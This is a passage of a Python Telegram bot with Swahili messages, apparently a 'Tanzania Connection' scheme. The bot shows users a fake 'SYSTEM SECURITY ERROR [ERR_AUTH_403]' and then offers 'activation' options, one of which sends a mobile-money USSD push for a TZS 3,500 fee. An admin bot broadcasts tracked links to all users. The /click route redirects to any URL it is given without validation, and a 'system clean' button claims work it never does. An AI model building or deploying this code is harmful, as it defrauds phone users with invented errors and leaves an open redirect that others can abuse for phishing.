                    update_order_status(order_id, "completed")
                    await status_msg.edit_text(
                        get_verified_success_text(),
                        parse_mode="HTML",
                        disable_web_page_preview=True,
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🟢 FUNGUA TOVUTI YA CONNECTION", url=TARGET_SITE)],
                            [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
                        ])
                    )
                else:
                    await status_msg.edit_text(
                        f"⏳ <b>MALIPO YANAENDELEA (PENDING)</b>\n\n"
                        f"Hali ya sasa: <code>{status}</code>\nTafadhali thibitisha malipo kwenye simu yako kisha uguse tena kitufe cha kukagua hapa chini.",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🔄 ANGALIA TENA MALIPO", callback_data=f"check_pay_{order_id}")],
                            [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
                        ])
                    )
            else:
                await status_msg.edit_text("❌ Imeshindikana kuangalia malipo. Jaribu tena baada ya sekunde chache.")
        except Exception:
            await status_msg.edit_text("❌ Hitilafu ya kimtandao wakati wa kuwasiliana na HarakaPay.")
    elif query.data == "back_to_error":
        await query.message.edit_text(
            "🛑 <b>SYSTEM SECURITY ERROR [ERR_AUTH_403]</b> 🛑\n\nChagua njia ya activation hapa chini 👇",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ ACTIVATION 1", callback_data="activation1"),
                    InlineKeyboardButton("✅ ACTIVATION 2", callback_data="activation2")
                ],
                [InlineKeyboardButton("✅ ACTIVATION 3", callback_data="activation3")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back")]
            ])
        )
    elif query.data == "back" or query.data == "back_to_regions":
        try:
            await query.message.delete()
        except Exception:
            pass
        await query.message.reply_text("✨ <b>Chagua mkoa wako kutoka kwenye orodha hapa chini:</b>", parse_mode="HTML", reply_markup=get_region_keyboard())

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text in REGIONS:
        await update.message.reply_text("⬅️ Umerudi kwenye mkoa.", reply_markup=get_region_keyboard())
        return ConversationHandler.END

    user_id = str(update.effective_user.id)
    phone = text

    if not phone.startswith("0") or len(phone) < 10:
        await update.message.reply_text("❌ Namba si sahihi. Weka namba sahihi ya simu (mfano: 0712345678) au tuma /cancel kusitisha:")
        return WAITING_PHONE

    status_msg = await update.message.reply_text("⏳ Inatuma ombi la USSD Push kwenye simu yako...")

    try:
        response = requests.post(
            f"{HARAKAPAY_BASE_URL}/api/v1/collect",
            json={
                "phone": phone,
                "amount": 3500,
                "description": "Connection Activation Fee"
            },
            headers={
                "Content-Type": "application/json",
                "X-API-Key": HARAKAPAY_API_KEY
            },
            timeout=15
        )
        res_data = response.json()

        if res_data.get("success"):
            order_id = res_data.get("order_id")
            save_order(order_id, user_id, phone, 3500, "pending")
            await status_msg.edit_text(
                f"📱 <b>USSD PUSH IMETUMWA!</b>\n\n"
                f"Weka PIN kwenye simu yako kulipia TZS 3,500.\n\n"
                f"Baada ya kuweka PIN, bonyeza kitufe hapa chini kukagua kama malipo yamethibitishwa:",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 ANGALIA HALI YA MALIPO", callback_data=f"check_pay_{order_id}")],
                    [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
                ])
            )
        else:
            await status_msg.edit_text(f"❌ Imeshindikana: {res_data.get('error', 'Jaribu tena baadaye.')}")
    except Exception:
        await status_msg.edit_text("❌ Hitilafu ya kimtandao wakati wa kuunganishwa na HarakaPay.")

    return ConversationHandler.END

async def cancel_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Imesitishwa.", reply_markup=get_region_keyboard())
    return ConversationHandler.END


# --- ADMIN PANEL ---
async def admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return
    total_users = get_total_users_count()
    await update.message.reply_text(
        f"👑 <b>Tanzania Connection - Master Admin Panel</b>\n\n"
        f"👥 Total Users: <code>{total_users}</code>\n"
        f"Chagua huduma unayotaka kusimamia hapa chini:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Takwimu za Jumla", callback_data="admin_stats"),
             InlineKeyboardButton("💰 Salio la HarakaPay", callback_data="admin_wallet")],
            [InlineKeyboardButton("👥 Orodha ya Watumiaji", callback_data="admin_users"),
             InlineKeyboardButton("🔍 Angalia Order", callback_data="admin_check_order")],
            [InlineKeyboardButton("📢 Tuma Tangazo", callback_data="admin_broadcast_prompt"),
             InlineKeyboardButton("🔄 Safisha Mfumo", callback_data="admin_clean")]
        ])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if str(query.from_user.id) != ADMIN_ID:
        return
    await query.answer()

    if query.data == "admin_stats":
        total_users = get_total_users_count()
        await query.message.edit_text(
            f"📊 <b>SYSTEM STATISTICS</b>\n\n"
            f"👥 Total Registered Users: <code>{total_users}</code>\n"
            f"🚀 System Status: <b>Online & Stable 24/7</b>\n\n"
            f"Bonyeza kitufe hapa chini kurudi:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
        )
    elif query.data == "admin_wallet":
        wallet_bal = 0
        float_bal = 0
        try:
            res = requests.get(f"{HARAKAPAY_BASE_URL}/api/v1/balance", headers={"X-API-Key": HARAKAPAY_API_KEY}, timeout=10).json()
            if res.get("success"):
                wallet_bal = res.get("wallet_balance", 0)
                float_bal = res.get("float_balance", 0)
        except Exception:
            pass
        await query.message.edit_text(
            f"💰 <b>HARAKAPAY WALLET & FLOAT</b>\n\n"
            f"💵 Wallet Balance: <code>TZS {wallet_bal}</code>\n"
            f"💎 Float Balance: <code>TZS {float_bal}</code>\n\n"
            f"Bonyeza kitufe hapa chini kurudi:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
        )
    elif query.data == "admin_users":
        total_users = get_total_users_count()
        users = get_all_users()
        recent = ", ".join(users[-5:]) if users else "Hakuna"
        await query.message.edit_text(
            f"👥 <b>WATUMIAJI WA MFUMO</b>\n\n"
            f"📈 Jumla ya Waliojiunga: <code>{total_users}</code>\n"
            f"🆔 ID za Watumiaji wa mwisho 5: <code>{recent}</code>\n\n"
            f"Bonyeza kitufe hapa chini kurudi:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
        )
    elif query.data == "admin_check_order":
        await query.message.edit_text(
            "🔍 <b>ANGALIA ORDER YA MALIPO</b>\n\n"
            "Tafadhali tuma Order ID (mfano: HP1706123456789) kwenye chat hii kukagua hali yake kwenye HarakaPay:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
        )
        return ADMIN_WAITING_ORDER
    elif query.data == "admin_broadcast_prompt":
        total_recipients = get_total_users_count()
        await query.message.edit_text(
            f"📢 <b>MFUMO WA KUTUMA MATANGAZO (BROADCAST HUB)</b>\n\n"
            f"👥 Walengwa waliopo kwenye Database: <b>{total_recipients}</b>\n\n"
            "Tuma hapa <b>Ujumbe, Picha, au Video</b> unayotaka kuwatumia watumiaji wote.\n\n"
            "💡 <i>Kama unahitaji kitufe (button) kwenye tangazo lako, andika ujumbe wako kisha Weka mstari wa mwisho kwa mfumo huu:</i>\n"
            "<code>Jina la Kitufe | https://linkyako.com</code>\n\n"
            "Tuma ujumbe wako sasa kuanza hakiki (preview):",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
        )
        return ADMIN_WAITING_BROADCAST
    elif query.data == "admin_clean":
        await query.message.edit_text(
            "🔄 <b>USAFISHAJI WA MFUMO</b>\n\n"
            "Kache na kumbukumbu zote za muda mfupi zimesafishwa. Mfumo upo safi na unafanya kazi kwa kasi ya juu.\n\n"
            "Bonyeza kitufe hapa chini kurudi:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
        )
    elif query.data == "admin_home":
        total_users = get_total_users_count()
        await query.message.edit_text(
            f"👑 <b>Tanzania Connection - Master Admin Panel</b>\n\n"
            f"👥 Total Users: <code>{total_users}</code>\n"
            f"Chagua huduma unayotaka kusimamia hapa chini:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 Takwimu za Jumla", callback_data="admin_stats"),
                 InlineKeyboardButton("💰 Salio la HarakaPay", callback_data="admin_wallet")],
                [InlineKeyboardButton("👥 Orodha ya Watumiaji", callback_data="admin_users"),
                 InlineKeyboardButton("🔍 Angalia Order", callback_data="admin_check_order")],
                [InlineKeyboardButton("📢 Tuma Tangazo", callback_data="admin_broadcast_prompt"),
                 InlineKeyboardButton("🔄 Safisha Mfumo", callback_data="admin_clean")]
            ])
        )

async def admin_receive_order(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return ConversationHandler.END
    order_id = update.message.text.strip()
    order_data = get_order_details(order_id)
    
    api_status = "Unknown"
    try:
        res = requests.get(
            f"{HARAKAPAY_BASE_URL}/api/v1/status/{order_id}",
            headers={"X-API-Key": HARAKAPAY_API_KEY},
            timeout=10
        ).json()
        if res.get("success"):
            api_status = res.get("payment", {}).get("status", "Unknown")
    except Exception:
        pass

    if order_data:
        uid, phone, amount, db_status = order_data
        await update.message.reply_text(
            f"📦 <b>MAELEZO YA ORDER: {order_id}</b>\n\n"
            f"👤 User ID: <code>{uid}</code>\n"
            f"📱 Namba ya Simu: <code>{phone}</code>\n"
            f"💵 Kiasi: <code>TZS {amount}</code>\n"
            f"💾 Hali (DB): <code>{db_status}</code>\n"
            f"🌐 Hali (HarakaPay API): <code>{api_status}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI KUBWA", callback_data="admin_home")]])
        )
    else:
        await update.message.reply_text(
            f"❌ Order ID <code>{order_id}</code> haipatikani kwenye database.\n(Hali ya API: {api_status})",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI KUBWA", callback_data="admin_home")]])
        )
    return ConversationHandler.END

# --- DIRECT URL BROADCAST PREVIEW & RE-UPLOAD WORKFLOW ---
async def admin_receive_broadcast_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return ConversationHandler.END
    
    msg = update.message
    context.user_data['broadcast_msg_obj'] = msg

    total_recipients = get_total_users_count()

    await msg.reply_text(
        f"👁️ <b>HAKIKI YA TANGAZO (PREVIEW)</b>\n\n"
        f"👥 Idadi ya walengwa watakaopokea: <b>{total_recipients}</b>\n"
        f"Hivi ndivyo ujumbe wako utakavyowafikia wanachama wote hapa chini:",
        parse_mode="HTML"
    )

    raw_text = msg.text or msg.caption or ""
    clean_text = raw_text
    preview_markup = None

    if "|" in raw_text:
        parts = raw_text.split("\n")
        last_line = parts[-1]
        if "|" in last_line:
            btn_text, btn_url = last_line.split("|", 1)
            clean_text = "\n".join(parts[:-1]).strip()
            destination_url = btn_url.strip()
            base_url = os.environ.get("RENDER_EXTERNAL_URL", "https://connection-bot.onrender.com")
            tracking_url = f"{base_url}/click?url={destination_url}"
            preview_markup = InlineKeyboardMarkup([[InlineKeyboardButton(btn_text.strip(), url=tracking_url)]])

    if msg.photo:
        await msg.reply_photo(photo=msg.photo[-1].file_id, caption=clean_text, parse_mode="HTML", reply_markup=preview_markup)
    elif msg.video:
        await msg.reply_video(video=msg.video.file_id, caption=clean_text, parse_mode="HTML", reply_markup=preview_markup)
    else:
        await msg.reply_text(clean_text, parse_mode="HTML", reply_markup=preview_markup)

    await msg.reply_text(
        "⚙️ <b>Ungependa kufanya nini sasa?</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 TUMA KWA WOTE SASA", callback_data="admin_confirm_broadcast")],
            [InlineKeyboardButton("❌ GHAIRI / SITISHA", callback_data="admin_cancel_broadcast")]
        ])
    )
    return ConversationHandler.END

async def admin_confirm_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE, main_app):
    query = update.callback_query
    if str(query.from_user.id) != ADMIN_ID:
        return
    await query.answer()

    msg_obj = context.user_data.get('broadcast_msg_obj')
    if not msg_obj:
        await query.message.edit_text("❌ Hakuna ujumbe uliopatikana wa kutuma. Tafadhali jaribu tena.")
        return

    users = get_all_users()
    success = 0
    failed = 0

    status_msg = await query.message.edit_text(f"🚀 Inaanza kutuma tangazo kwa watumiaji {len(users)} kupitia Main Bot...")

    raw_text = msg_obj.text or msg_obj.caption or ""
    clean_text = raw_text
    final_markup = None
    destination_url = ""

    if "|" in raw_text:
        parts = raw_text.split("\n")
        last_line = parts[-1]
        if "|" in last_line:
            btn_text, btn_url = last_line.split("|", 1)
            clean_text = "\n".join(parts[:-1]).strip()
            destination_url = btn_url.strip()
            base_url = os.environ.get("RENDER_EXTERNAL_URL", "https://connection-bot.onrender.com")
            tracking_url = f"{base_url}/click?url={destination_url}"
            final_markup = InlineKeyboardMarkup([[InlineKeyboardButton(btn_text.strip(), url=tracking_url)]])

    media_file_bytes = None
    media_type = None
    if msg_obj.photo:
        media_type = "photo"
        file_obj = await context.bot.get_file(msg_obj.photo[-1].file_id)
        media_file_bytes = await file_obj.download_as_bytearray()
    elif msg_obj.video:
        media_type = "video"
        file_obj = await context.bot.get_file(msg_obj.video.file_id)
        media_file_bytes = await file_obj.download_as_bytearray()

    for uid in users:
        try:
            if media_type == "photo":
                await main_app.bot.send_photo(chat_id=uid, photo=bytes(media_file_bytes), caption=clean_text, parse_mode="HTML", reply_markup=final_markup)
            elif media_type == "video":
                await main_app.bot.send_video(chat_id=uid, video=bytes(media_file_bytes), caption=clean_text, parse_mode="HTML", reply_markup=final_markup)
            else:
                await main_app.bot.send_message(chat_id=uid, text=clean_text, parse_mode="HTML", reply_markup=final_markup)
            success += 1
            await asyncio.sleep(0.04)
        except Exception:
            failed += 1

    clicks = get_click_count_for_url(destination_url) if destination_url else 0
    await status_msg.edit_text(
        f"✅ <b>TANGAZO LIMETUMWA KIKAMILIFU!</b>\n\n"
        f"📤 Imefanikiwa Kutumika: <code>{success}</code>\n"
        f"❌ Imeshindikana: <code>{failed}</code>\n"
        f"📊 Jumla ya Clicks: <code>{clicks}</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI KWENYE MENYU", callback_data="admin_home")]])
    )

async def admin_cancel_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if str(query.from_user.id) != ADMIN_ID:
        return
    await query.answer()
    await query.message.edit_text(
        "❌ <b>Utumaji wa tangazo umesitishwa. Hakuna kilichotumwa.</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI KWENYE MENYU", callback_data="admin_home")]])
    )


# --- FLASK WEB SERVER WITH CLICK ANALYTICS REDIRECT ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Connection Bot Fully Upgraded & Running 24/7!"

@app.route('/click')
def click_redirect():
    target_url = request.args.get('url', TARGET_SITE)
    log_broadcast_click("user", target_url)
    return redirect(target_url)

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)


# --- AUTOMATION LOOP ---
async def background_automation_loop(main_app):
    while True:
        await asyncio.sleep(3600)
        now = datetime.utcnow()
        if now.weekday() == 0 and now.hour == 3:
            if os.path.exists("bot_database.db"):
                try:
                    with open("bot_database.db", "rb") as db_file:
                        await main_app.bot.send_document(
                            chat_id=ADMIN_ID,
                            document=db_file,
                            caption=f"📦 <b>AUTOMATED WEEKLY DATABASE BACKUP</b>\n📅 {now.strftime('%Y-%m-%d %H:%M:%S')} UTC",
                            parse_mode="HTML"
                        )
                except Exception:
                    pass


# --- UNIFIED ASYNC MAIN RUNNER ---
async def main():
    init_db()

    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    main_app = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()
    admin_app = ApplicationBuilder().token(ADMIN_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_callback, pattern="^activation3$")],
        states={
            WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)]
        },
        fallbacks=[CommandHandler("cancel", cancel_phone)]
    )

    admin_conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_callback, pattern="^admin_check_order$")],
        states={
            ADMIN_WAITING_ORDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_receive_order)]
        },
        fallbacks=[]
    )

    admin_broadcast_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_callback, pattern="^admin_broadcast_prompt$")],
        states={
            ADMIN_WAITING_BROADCAST: [MessageHandler(filters.ALL & ~filters.COMMAND, admin_receive_broadcast_content)]
        },
        fallbacks=[]
    )

    # Main Bot Handlers
    main_app.add_handler(CommandHandler("start", start))
    main_app.add_handler(CallbackQueryHandler(age_callback, pattern="^age_"))
    main_app.add_handler(conv_handler)
    main_app.add_handler(CallbackQueryHandler(handle_callback))
    main_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, region_click))

    # Admin Bot Handlers
    admin_app.add_handler(CommandHandler("start", admin_start))
    admin_app.add_handler(admin_conv_handler)
    admin_app.add_handler(admin_broadcast_conv)
    admin_app.add_handler(CallbackQueryHandler(lambda u, c: admin_confirm_broadcast_callback(u, c, main_app), pattern="^admin_confirm_broadcast$"))
    admin_app.add_handler(CallbackQueryHandler(admin_cancel_broadcast_callback, pattern="^admin_cancel_broadcast$"))
    admin_app.add_handler(CallbackQueryHandler(admin_callback))

    await main_app.initialize()
    await admin_app.initialize()
    await main_app.start()
    await admin_app.start()

    await main_app.updater.start_polling()
    await admin_app.updater.start_polling()

    asyncio.create_task(background_automation_loop(main_app))

    print("🤖 Upgraded Main Bot & Master Admin Panel running successfully with zero errors!")

    stop_event = asyncio.Event()
    await stop_event.wait()

if __name__ == "__main__":
    asyncio.run(main())
